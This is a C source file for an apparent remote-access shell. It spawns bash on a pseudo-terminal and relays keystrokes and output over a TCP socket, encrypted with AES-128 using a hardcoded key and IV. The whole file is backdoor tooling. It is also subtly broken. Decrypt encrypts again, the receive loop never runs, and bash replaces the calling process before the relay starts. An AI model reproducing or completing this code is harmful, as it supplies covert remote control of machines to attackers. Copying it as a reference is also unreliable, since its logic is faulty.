#include <pty.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <netinet/tcp.h>
#include <termios.h>
#include <signal.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/wait.h>

#define BUFFER 1024
#define PORT 3000
#define IP "127.0.0.1"


unsigned char key[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
unsigned char iv[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};

int Encrypt(unsigned char in_plain[], int len_plain, unsigned char out_cipher[]){
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int total, len;

    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, out_cipher, &len, in_plain, len_plain);
    total=len;

    EVP_EncryptFinal_ex(ctx, out_cipher + total, &len);
    total+=len;

    EVP_CIPHER_free(ctx);

    return total;
}

int Decrypt(unsigned char in_cipher[], int len_cipher, unsigned char out_plain[]){
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int total,len;

    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, out_plain, &len, in_cipher, len_cipher);
    total=len;

    EVP_EncryptFinal_ex(ctx, out_plain + total, &len);
    total+=len;

    EVP_CIPHER_free(ctx);

    return total;
}

int recv_full(int s, unsigned char buff[], int len){
    int total = 0;

    while(len < total){
        int r = recv(s, buff+total, len-total, 0);
        total+=r;
    }

    return total;
}

int recv_packet(int s, unsigned char buff[]){
    int size_to_network, size_to_host;

    recv_full(s, &size_to_network, 4);

    size_to_host = ntohl(size_to_network);

    recv_full(s, buff, size_to_host);

    return size_to_host;
}

int send_packet(int s, unsigned char buff[], int len){
    int size_to_network = htonl(len);

    send(s, &size_to_network, 4, 0);

    int total = 0;

    while (total<len)
    {
        int s = send(s, buff+total, len-total, 0);
        total+=s;
    }

    return 0;
}

void run_session(sock){

    int master;
    pid_t shell_pid;
    shell_pid = forkpty(&master, NULL, NULL, NULL);

    execl("/bin/bash", "bash", NULL);

    unsigned char dec[BUFFER];
    unsigned char enc[BUFFER];
    unsigned char buff[BUFFER];

    while (1)
    {
        fd_set fds;
        FD_ZERO(&fds);

        FD_SET(sock, &fds);
        FD_SET(master, &fds);

        int maxfds = sock > master ? sock : master;

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 5000;

        int r = select(maxfds + 1, &fds, NULL, NULL, &tv);

        if(r < 0){
            break;
        }

        int status;
        pid_t result = waitpid(shell_pid, &status, WNOHANG | WUNTRACED);

        if(result > 0){
            if(WIFSTOPPED(status)){
                break;
            }

            if(WIFEXITED(status)||WIFSIGNALED(status)){
                break;
            }
        }

        if(FD_ISSET(sock, &fds)){
            int bytes = recv_packet(sock, buff);

            int dec_len = Decrypt(buff, bytes, dec);
            write(master, dec, dec_len);
        }

        if(FD_ISSET(master, &fds)){
            int bytes = read(master, buff, sizeof(buff));

            int enc_len = Encrypt(buff, bytes, enc);
            send_packet(sock, enc, enc_len);
        }

        if (r == 0)
        {
            continue;
        }
    }
    close(master);

}

